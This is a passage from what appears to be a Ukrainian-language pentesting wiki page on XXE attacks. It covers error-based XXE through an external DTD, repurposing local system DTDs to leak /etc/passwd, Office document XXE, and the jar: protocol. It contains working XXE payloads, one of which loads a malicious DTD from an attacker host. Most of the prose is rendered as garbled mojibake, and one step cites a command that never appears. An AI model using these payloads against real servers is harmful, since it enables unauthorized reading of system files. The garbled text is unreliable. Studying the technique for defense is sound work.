1. –í–∏–∑–Ω–∞—á–∞—î—Ç—å—Å—è XML –ø–∞—Ä–∞–º–µ—Ç—Ä–∏—á–Ω–∏–π –æ–±'—î–∫—Ç –∑ —ñ–º'—è–º `file`, —è–∫–∏–π –º—ñ—Å—Ç–∏—Ç—å –≤–º—ñ—Å—Ç —Ñ–∞–π–ª—É `/etc/passwd`.
2. –í–∏–∑–Ω–∞—á–∞—î—Ç—å—Å—è XML –ø–∞—Ä–∞–º–µ—Ç—Ä–∏—á–Ω–∏–π –æ–±'—î–∫—Ç –∑ —ñ–º'—è–º `eval`, —è–∫–∏–π –≤–∫–ª—é—á–∞—î –¥–∏–Ω–∞–º—ñ—á–Ω–µ –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è –¥–ª—è —ñ–Ω—à–æ–≥–æ XML –ø–∞—Ä–∞–º–µ—Ç—Ä–∏—á–Ω–æ–≥–æ –æ–±'—î–∫—Ç–∞ –∑ —ñ–º'—è–º `error`. –¶–µ–π –æ–±'—î–∫—Ç `error`, –ø—Ä–∏ –æ—Ü—ñ–Ω—Ü—ñ, –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –Ω–µ—ñ—Å–Ω—É—é—á–∏–π —Ñ–∞–π–ª, –≤–∫–ª—é—á–∞—é—á–∏ –≤–º—ñ—Å—Ç –æ–±'—î–∫—Ç–∞ `file` —è–∫ –π–æ–≥–æ —ñ–º'—è.
3. –í–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è –æ–±'—î–∫—Ç `eval`, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –¥–∏–Ω–∞–º—ñ—á–Ω–æ–≥–æ –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è –æ–±'—î–∫—Ç–∞ `error`.
4. –í–∏–∫–ª–∏–∫–∞–Ω–Ω—è –æ–±'—î–∫—Ç–∞ `error` –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ —Å–ø—Ä–æ–±–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –Ω–µ—ñ—Å–Ω—É—é—á–∏–π —Ñ–∞–π–ª, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –ø–æ–º–∏–ª–∫—É, —è–∫–µ –º—ñ—Å—Ç–∏—Ç—å –≤–º—ñ—Å—Ç —Ñ–∞–π–ª—É `/etc/passwd` —è–∫ —á–∞—Å—Ç–∏–Ω—É —ñ–º–µ–Ω—ñ —Ñ–∞–π–ª—É.

–®–∫—ñ–¥–ª–∏–≤–∏–π –∑–æ–≤–Ω—ñ—à–Ω—ñ–π DTD –º–æ–∂–Ω–∞ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
–ü—ñ—Å–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –≤—ñ–¥–ø–æ–≤—ñ–¥—å –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–∞ –ø–æ–≤–∏–Ω–Ω–∞ –º—ñ—Å—Ç–∏—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –ø–æ–º–∏–ª–∫—É, —è–∫–µ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î –≤–º—ñ—Å—Ç —Ñ–∞–π–ª—É `/etc/passwd`.

![](<../.gitbook/assets/image (223) (1).png>)

_**–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –∑–æ–≤–Ω—ñ—à–Ω—ñ–π DTD –¥–æ–∑–≤–æ–ª—è—î –Ω–∞–º –≤–∫–ª—é—á–∏—Ç–∏ –æ–¥–∏–Ω –µ–ª–µ–º–µ–Ω—Ç –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –¥—Ä—É–≥–æ–≥–æ (****`eval`****), –∞–ª–µ —Ü–µ –∑–∞–±–æ—Ä–æ–Ω–µ–Ω–æ –≤–æ –≤–Ω—É—Ç—Ä—ñ—à–Ω—å–æ–º—É DTD. –¢–æ–º—É –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –ø–æ–º–∏–ª–∫—É –±–µ–∑ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –∑–æ–≤–Ω—ñ—à–Ω—å–æ–≥–æ DTD (–∑–∞–∑–≤–∏—á–∞–π).**_

### **–ó–∞—Å–Ω–æ–≤–∞–Ω–∏–π –Ω–∞ –ø–æ–º–∏–ª–∫–∞—Ö (—Å–∏—Å—Ç–µ–º–Ω–∏–π DTD)**

–û—Ç–∂–µ, —â–æ –Ω–∞ —Ä–∞—Ö—É–Ω–æ–∫ —Å–ª—ñ–ø–∏—Ö –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π XXE, –∫–æ–ª–∏ **–±–ª–æ–∫—É—é—Ç—å—Å—è –≤–∑–∞—î–º–æ–¥—ñ—ó –ø–æ–∑–∞ –º–µ—Ä–µ–∂–µ—é** (–∑–æ–≤–Ω—ñ—à–Ω—ñ –∑'—î–¥–Ω–∞–Ω–Ω—è –Ω–µ–¥–æ—Å—Ç—É–ø–Ω—ñ)?.

–£ –ª–∞–∑—É–Ω—Ü—ñ —É —Å–ø–µ—Ü–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –º–æ–≤–∏ XML –º–æ–∂–µ **—Ä–æ–∑–∫—Ä–∏—Ç–∏ —á—É—Ç–ª–∏–≤—ñ –¥–∞–Ω—ñ —á–µ—Ä–µ–∑ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –ø–æ–º–∏–ª–∫—É, –∫–æ–ª–∏ DTD –¥–æ–∫—É–º–µ–Ω—Ç–∞ –ø–æ—î–¥–Ω—É—î –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ —Ç–∞ –∑–æ–≤–Ω—ñ—à–Ω—ñ –æ–≥–æ–ª–æ—à–µ–Ω–Ω—è**. –¶—è –ø—Ä–æ–±–ª–µ–º–∞ –¥–æ–∑–≤–æ–ª—è—î –≤–Ω—É—Ç—Ä—ñ—à–Ω—î –ø–µ—Ä–µ–≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è –µ–ª–µ–º–µ–Ω—Ç—ñ–≤, –æ–≥–æ–ª–æ—à–µ–Ω–∏—Ö –∑–æ–≤–Ω—ñ, —â–æ —Å–ø—Ä–∏—è—î –≤–∏–∫–æ–Ω–∞–Ω–Ω—é –∞—Ç–∞–∫ XXE –Ω–∞ –æ—Å–Ω–æ–≤—ñ –ø–æ–º–∏–ª–æ–∫. –¢–∞–∫—ñ –∞—Ç–∞–∫–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å –ø–µ—Ä–µ–≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è –ø–∞—Ä–∞–º–µ—Ç—Ä–Ω–æ–≥–æ –µ–ª–µ–º–µ–Ω—Ç–∞ XML, —Å–ø–æ—á–∞—Ç–∫—É –æ–≥–æ–ª–æ—à–µ–Ω–æ–≥–æ –≤ –∑–æ–≤–Ω—ñ—à–Ω—å–æ–º—É DTD, –∑ –≤–Ω—É—Ç—Ä—ñ—à–Ω—å–æ–≥–æ DTD. –ö–æ–ª–∏ —Å–µ—Ä–≤–µ—Ä –±–ª–æ–∫—É—î –∑–≤'—è–∑–∫–∏ –ø–æ–∑–∞ –º–µ—Ä–µ–∂–µ—é, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∏ –ø–æ–≤–∏–Ω–Ω—ñ –ø–æ–∫–ª–∞–¥–∞—Ç–∏—Å—è –Ω–∞ –ª–æ–∫–∞–ª—å–Ω—ñ —Ñ–∞–π–ª–∏ DTD –¥–ª—è –ø—Ä–æ–≤–µ–¥–µ–Ω–Ω—è –∞—Ç–∞–∫–∏, —Å–ø—Ä—è–º–æ–≤–∞–Ω–æ—ó –Ω–∞ –≤–∏–∫–ª–∏–∫–∞–Ω–Ω—è –ø–æ–º–∏–ª–∫–∏ —Ä–æ–∑–±–æ—Ä—É –¥–ª—è —Ä–æ–∑–∫—Ä–∏—Ç—Ç—è —á—É—Ç–ª–∏–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó.

–ü—Ä–∏–ø—É—Å—Ç–∏–º–æ, —â–æ —Ñ–∞–π–ª–æ–≤–∞ —Å–∏—Å—Ç–µ–º–∞ —Å–µ—Ä–≤–µ—Ä–∞ –º—ñ—Å—Ç–∏—Ç—å —Ñ–∞–π–ª DTD –∑–∞ —à–ª—è—Ö–æ–º `/usr/local/app/schema.dtd`, —è–∫–∏–π –≤–∏–∑–Ω–∞—á–∞—î –µ–ª–µ–º–µ–Ω—Ç –∑ –Ω–∞–∑–≤–æ—é `custom_entity`. –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –ø–æ–º–∏–ª–∫—É —Ä–æ–∑–±–æ—Ä—É XML, —Ä–æ–∑–∫—Ä–∏–≤–∞—é—á–∏ –≤–º—ñ—Å—Ç —Ñ–∞–π–ª—É `/etc/passwd`, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ –≥—ñ–±—Ä–∏–¥–Ω–∏–π DTD –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ –≤–∏–≥–ª—è–¥—É:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
–í–∫–∞–∑–∞–Ω—ñ –∫—Ä–æ–∫–∏ –≤–∏–∫–æ–Ω—É—é—Ç—å—Å—è —Ü–∏–º DTD:

* –í–∏–∑–Ω–∞—á–µ–Ω–Ω—è XML-–ø–∞—Ä–∞–º–µ—Ç—Ä–Ω–æ–≥–æ –æ–±'—î–∫—Ç–∞ –∑ —ñ–º–µ–Ω–µ–º `local_dtd` –≤–∫–ª—é—á–∞—î –∑–æ–≤–Ω—ñ—à–Ω—ñ–π —Ñ–∞–π–ª DTD, —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–∏–π –Ω–∞ —Ñ–∞–π–ª–æ–≤—ñ–π —Å–∏—Å—Ç–µ–º—ñ —Å–µ—Ä–≤–µ—Ä–∞.
* –í—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è –ø–µ—Ä–µ–≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è –ø–∞—Ä–∞–º–µ—Ç—Ä–Ω–æ–≥–æ –æ–±'—î–∫—Ç–∞ XML `custom_entity`, —Å–ø–æ—á–∞—Ç–∫—É –≤–∏–∑–Ω–∞—á–µ–Ω–æ–≥–æ –≤ –∑–æ–≤–Ω—ñ—à–Ω—å–æ–º—É DTD, –¥–ª—è —É–ø–∞–∫—É–≤–∞–Ω–Ω—è [–µ–∫—Å–ø–ª–æ–π—Ç—É XXE –Ω–∞ –æ—Å–Ω–æ–≤—ñ –ø–æ–º–∏–ª–æ–∫](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages). –¶–µ –ø–µ—Ä–µ–≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–µ –¥–ª—è –≤–∏–∫–ª–∏–∫—É –ø–æ–º–∏–ª–∫–∏ —Ä–æ–∑–±–æ—Ä—É, —â–æ –≤–∏–∫—Ä–∏–≤–∞—î –≤–º—ñ—Å—Ç —Ñ–∞–π–ª—É `/etc/passwd`.
* –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –æ–±'—î–∫—Ç `local_dtd`, –∑–∞–ª—É—á–∞—î—Ç—å—Å—è –∑–æ–≤–Ω—ñ—à–Ω—ñ–π DTD, –æ—Ö–æ–ø–ª—é—é—á–∏ –Ω–æ–≤–æ –≤–∏–∑–Ω–∞—á–µ–Ω–∏–π `custom_entity`. –¶—è –ø–æ—Å–ª—ñ–¥–æ–≤–Ω—ñ—Å—Ç—å –¥—ñ–π –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –≤–∏–Ω–∏–∫–Ω–µ–Ω–Ω—è –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –ø–æ–º–∏–ª–∫—É, –Ω–∞ —è–∫–µ —Å–ø—Ä—è–º–æ–≤–∞–Ω–∏–π –µ–∫—Å–ø–ª–æ–π—Ç.

**–ü—Ä–∏–∫–ª–∞–¥ –∑ —Ä–µ–∞–ª—å–Ω–æ–≥–æ –∂–∏—Ç—Ç—è:** –°–∏—Å—Ç–µ–º–∏, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å —Å–µ—Ä–µ–¥–æ–≤–∏—â–µ —Ä–æ–±–æ—á–æ–≥–æ —Å—Ç–æ–ª—É GNOME, —á–∞—Å—Ç–æ –º–∞—é—Ç—å DTD –∑–∞ —à–ª—è—Ö–æ–º `/usr/share/yelp/dtd/docbookx.dtd`, —â–æ –º—ñ—Å—Ç–∏—Ç—å –æ–±'—î–∫—Ç –∑ —ñ–º–µ–Ω–µ–º `ISOamso`.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
–Ø–∫—â–æ —Ü—è —Ç–µ—Ö–Ω—ñ–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î **–≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ–π DTD, —Å–ø–æ—á–∞—Ç–∫—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–Ω–∞–π—Ç–∏ –¥—ñ–π—Å–Ω–∏–π**. –¶–µ –º–æ–∂–Ω–∞ –∑—Ä–æ–±–∏—Ç–∏, **–≤—Å—Ç–∞–Ω–æ–≤–∏–≤—à–∏** —Ç–æ–π —Å–∞–º–∏–π **OS / Software**, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Å–µ—Ä–≤–µ—Ä, —ñ **–ø–æ—à—É–∫–∞–≤—à–∏ –¥–µ—è–∫—ñ —Ç–∏–ø–æ–≤—ñ DTD**, –∞–±–æ **–æ—Ç—Ä–∏–º–∞–≤—à–∏ —Å–ø–∏—Å–æ–∫** **—Ç–∏–ø–æ–≤–∏—Ö DTD** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Å–∏—Å—Ç–µ–º —Ç–∞ **–ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏**, —á–∏ —ñ—Å–Ω—É—î —Ö–æ—á–∞ –± –æ–¥–∏–Ω –∑ –Ω–∏—Ö:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### –ü–æ—à—É–∫ DTD –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Å–∏—Å—Ç–µ–º–∏

–£ –Ω–∞—Å—Ç—É–ø–Ω–æ–º—É —á—É–¥–æ–≤–æ–º—É —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó github –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ **—à–ª—è—Ö–∏ DTD, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –ø—Ä–∏—Å—É—Ç–Ω—ñ –≤ —Å–∏—Å—Ç–µ–º—ñ**:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

–ö—Ä—ñ–º —Ç–æ–≥–æ, —è–∫—â–æ —É –≤–∞—Å —î **–æ–±—Ä–∞–∑ Docker —Å–∏—Å—Ç–µ–º–∏ –∂–µ—Ä—Ç–≤–∏**, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –∑ —Ç–æ–≥–æ –∂ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é –¥–ª—è **—Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è** **–æ–±—Ä–∞–∑—É** —Ç–∞ **–∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è** —à–ª—è—Ö—É **DTD**, —è–∫—ñ –ø—Ä–∏—Å—É—Ç–Ω—ñ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Å–∏—Å—Ç–µ–º–∏. –ü—Ä–æ—á–∏—Ç–∞–π—Ç–µ [Readme —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é github](https://github.com/GoSecure/dtd-finder), —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è —è–∫.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE —á–µ—Ä–µ–∑ –ø–∞—Ä—Å–µ—Ä–∏ Office Open XML

–î–ª—è –±—ñ–ª—å—à –¥–µ—Ç–∞–ª—å–Ω–æ–≥–æ –ø–æ—è—Å–Ω–µ–Ω–Ω—è —Ü—å–æ–≥–æ –∞—Ç–∞–∫–∏, **–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –¥—Ä—É–≥–∏–π —Ä–æ–∑–¥—ñ–ª** [**—Ü—å–æ–≥–æ –¥–∏–≤–æ–≤–∏–∂–Ω–æ–≥–æ –ø–æ—Å—Ç—É**](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) **–≤—ñ–¥ Detectify**.

–ú–æ–∂–ª–∏–≤—ñ—Å—Ç—å **–∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –¥–æ–∫—É–º–µ–Ω—Ç—ñ–≤ Microsoft Office –ø—Ä–æ–ø–æ–Ω—É—î—Ç—å—Å—è –±–∞–≥–∞—Ç—å–º–∞ –≤–µ–±-–¥–æ–¥–∞—Ç–∫–∞–º–∏**, —è–∫—ñ –ø–æ—Ç—ñ–º –ø—Ä–æ–¥–æ–≤–∂—É—é—Ç—å –≤–∏–¥–æ–±—É–≤–∞—Ç–∏ –ø–µ–≤–Ω—ñ –¥–µ—Ç–∞–ª—ñ –∑ —Ü–∏—Ö –¥–æ–∫—É–º–µ–Ω—Ç—ñ–≤. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, –≤–µ–±-–¥–æ–¥–∞—Ç–æ–∫ –º–æ–∂–µ –¥–æ–∑–≤–æ–ª—è—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º —ñ–º–ø–æ—Ä—Ç—É–≤–∞—Ç–∏ –¥–∞–Ω—ñ, –∑–∞–≤–∞–Ω—Ç–∞–∂—É—é—á–∏ —Ç–∞–±–ª–∏—Ü—é —É —Ñ–æ—Ä–º–∞—Ç—ñ XLSX. –î–ª—è —Ç–æ–≥–æ, —â–æ–± –ø–∞—Ä—Å–µ—Ä –º—ñ–≥ –≤–∏–¥–æ–±—É—Ç–∏ –¥–∞–Ω—ñ –∑ —Ç–∞–±–ª–∏—Ü—ñ, –π–æ–º—É –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ –±—É–¥–µ —Ä–æ–∑—ñ–±—Ä–∞—Ç–∏ –ø—Ä–∏–Ω–∞–π–º–Ω—ñ –æ–¥–∏–Ω —Ñ–∞–π–ª XML.

–î–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ —Ü—ñ—î—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ —Å—Ç–≤–æ—Ä–∏—Ç–∏ **—Ñ–∞–π–ª Microsoft Office, —â–æ –º—ñ—Å—Ç–∏—Ç—å –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è XXE**. –ü–µ—Ä—à–∏–º –∫—Ä–æ–∫–æ–º —î —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –ø–æ—Ä–æ–∂–Ω—å–æ–≥–æ –∫–∞—Ç–∞–ª–æ–≥—É, –¥–æ —è–∫–æ–≥–æ –º–æ–∂–Ω–∞ —Ä–æ–∑–ø–∞–∫—É–≤–∞—Ç–∏ –¥–æ–∫—É–º–µ–Ω—Ç.

–ü—ñ—Å–ª—è —Ä–æ–∑–ø–∞–∫—É–≤–∞–Ω–Ω—è –¥–æ–∫—É–º–µ–Ω—Ç–∞, —Ñ–∞–π–ª XML, —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–∏–π –∑–∞ –∞–¥—Ä–µ—Å–æ—é `./unzipped/word/document.xml`, —Å–ª—ñ–¥ –≤—ñ–¥–∫—Ä–∏—Ç–∏ —Ç–∞ –≤—ñ–¥—Ä–µ–¥–∞–≥—É–≤–∞—Ç–∏ —É –≤–∏–±—Ä–∞–Ω–æ–º—É —Ç–µ–∫—Å—Ç–æ–≤–æ–º—É —Ä–µ–¥–∞–∫—Ç–æ—Ä—ñ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, vim). XML –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ –∑–º—ñ–Ω–µ–Ω–∏–π —Ç–∞–∫, —â–æ–± –≤–∫–ª—é—á–∏—Ç–∏ –±–∞–∂–∞–Ω–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è XXE, —á–∞—Å—Ç–æ –ø–æ—á–∏–Ω–∞—é—á–∏ –∑ –∑–∞–ø–∏—Ç—É HTTP.

–ó–º—ñ–Ω–µ–Ω—ñ —Ä—è–¥–∫–∏ XML –ø–æ–≤–∏–Ω–Ω—ñ –±—É—Ç–∏ –≤—Å—Ç–∞–≤–ª–µ–Ω—ñ –º—ñ–∂ –¥–≤–æ–º–∞ –∫–æ—Ä–µ–Ω–µ–≤–∏–º–∏ –æ–±'—î–∫—Ç–∞–º–∏ XML. –í–∞–∂–ª–∏–≤–æ –∑–∞–º—ñ–Ω–∏—Ç–∏ URL –Ω–∞ URL, —è–∫–∏–π –º–æ–∂–Ω–∞ –≤—ñ–¥—Å—Ç–µ–∂—É–≤–∞—Ç–∏ –¥–ª—è –∑–∞–ø–∏—Ç—ñ–≤.

–ù–∞—Ä–µ—à—Ç—ñ, —Ñ–∞–π–ª –º–æ–∂–Ω–∞ –∑–∞–ø–∞–∫—É–≤–∞—Ç–∏, —â–æ–± —Å—Ç–≤–æ—Ä–∏—Ç–∏ —à–∫—ñ–¥–ª–∏–≤–∏–π —Ñ–∞–π–ª poc.docx. –ó –ø–∞–ø–∫–∏ "unzipped", —Å—Ç–≤–æ—Ä–µ–Ω–æ—ó —Ä–∞–Ω—ñ—à–µ, —Å–ª—ñ–¥ –≤–∏–∫–æ–Ω–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—É –∫–æ–º–∞–Ω–¥—É:

–¢–µ–ø–µ—Ä —Å—Ç–≤–æ—Ä–µ–Ω–∏–π —Ñ–∞–π–ª –º–æ–∂–Ω–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –≤ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –≤—Ä–∞–∑–ª–∏–≤–∏–π –≤–µ–±-–¥–æ–¥–∞—Ç–æ–∫, —ñ –º–æ–∂–Ω–∞ —Å–ø–æ–¥—ñ–≤–∞—Ç–∏—Å—è, —â–æ –∑–∞–ø–∏—Ç –∑'—è–≤–∏—Ç—å—Å—è –≤ –∂—É—Ä–Ω–∞–ª–∞—Ö —Å–ø—ñ–≤–ø—Ä–∞—Ü—ñ Burp.

### –ü—Ä–æ—Ç–æ–∫–æ–ª Jar:

–ü—Ä–æ—Ç–æ–∫–æ–ª **jar** –¥–æ—Å—Ç—É–ø–Ω–∏–π –≤–∏–∫–ª—é—á–Ω–æ –≤ –º–µ–∂–∞—Ö **Java-–¥–æ–¥–∞—Ç–∫—ñ–≤**. –í—ñ–Ω –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è –¥–æ—Å—Ç—É–ø—É –¥–æ —Ñ–∞–π–ª—ñ–≤ —É **–∞—Ä—Ö—ñ–≤—ñ PKZIP** (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `.zip`, `.jar`, —Ç–æ—â–æ), –æ–±—Å–ª—É–≥–æ–≤—É–≤–∞–Ω–Ω—è —è–∫ –ª–æ–∫–∞–ª—å–Ω–∏—Ö, —Ç–∞–∫ —ñ –≤—ñ–¥–¥–∞–ª–µ–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤.
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
–î–ª—è –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ –¥–æ—Å—Ç—É–ø—É –¥–æ —Ñ–∞–π–ª—ñ–≤ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ñ–∞–π–ª—ñ–≤ PKZIP **–¥—É–∂–µ –∫–æ—Ä–∏—Å–Ω–æ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ XXE —á–µ—Ä–µ–∑ —Ñ–∞–π–ª–∏ —Å–∏—Å—Ç–µ–º–∏ DTD.** –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [—Ü–µ–π —Ä–æ–∑–¥—ñ–ª, —â–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —è–∫ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ñ–∞–π–ª–∞–º–∏ —Å–∏—Å—Ç–µ–º–∏ DTD](xxe-xee-xml-external-entity.md#error-based-system-dtd).
{% endhint %}

–ü—Ä–æ—Ü–µ—Å –¥–æ—Å—Ç—É–ø—É –¥–æ —Ñ–∞–π–ª—É –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∞—Ä—Ö—ñ–≤—É PKZIP –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø—Ä–æ—Ç–æ–∫–æ–ª—É jar –≤–∫–ª—é—á–∞—î –∫—ñ–ª—å–∫–∞ –∫—Ä–æ–∫—ñ–≤:

1. –í–∏–∫–æ–Ω—É—î—Ç—å—Å—è HTTP-–∑–∞–ø–∏—Ç –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è zip-–∞—Ä—Ö—ñ–≤—É –∑ –≤–∫–∞–∑–∞–Ω–æ–≥–æ –º—ñ—Å—Ü—è, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `https://download.website.com/archive.zip`.
2. HTTP-–≤—ñ–¥–ø–æ–≤—ñ–¥—å, —â–æ –º—ñ—Å—Ç–∏—Ç—å –∞—Ä—Ö—ñ–≤, —Ç–∏–º—á–∞—Å–æ–≤–æ –∑–±–µ—Ä—ñ–≥–∞—î—Ç—å—Å—è –Ω–∞ —Å–∏—Å—Ç–µ–º—ñ, –∑–∞–∑–≤–∏—á–∞–π –≤ –º—ñ—Å—Ü—ñ, —Ç–∞–∫–æ–º—É —è–∫ `/tmp/...`.
3. –ü–æ—Ç—ñ–º –∞—Ä—Ö—ñ–≤ —Ä–æ–∑–ø–∞–∫–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ –π–æ–≥–æ –≤–º—ñ—Å—Ç—É.
4. –ß–∏—Ç–∞—î—Ç—å—Å—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–π —Ñ–∞–π–ª –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∞—Ä—Ö—ñ–≤—É, `file.zip`.
